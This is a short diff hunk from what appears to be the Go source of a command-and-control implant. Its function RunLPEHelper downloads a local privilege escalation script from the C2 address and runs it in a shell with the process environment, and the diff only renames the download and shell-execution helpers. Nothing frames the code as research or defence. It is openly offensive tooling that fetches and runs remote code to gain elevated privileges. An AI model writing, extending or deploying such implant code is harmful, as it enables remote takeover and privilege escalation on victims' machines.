@@ -42,14 +42,14 @@ func CopySelfTo(dest_file string) (err error) {
 func RunLPEHelper(method, checksum string) (out string) {
 	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := c2transport.SmartDownload("", method, "", checksum)
+	scriptData, err := c2transport.FetchFile("", method, "", checksum)
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
 
 	// run the script
 	logging.Printf("Running LPE helper %s", method)
-	out, err = agentutils.RunShellScript(scriptData, os.Environ())
+	out, err = agentutils.ExecuteShell(scriptData, os.Environ())
 	if err != nil {
 		return logging.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
 	}
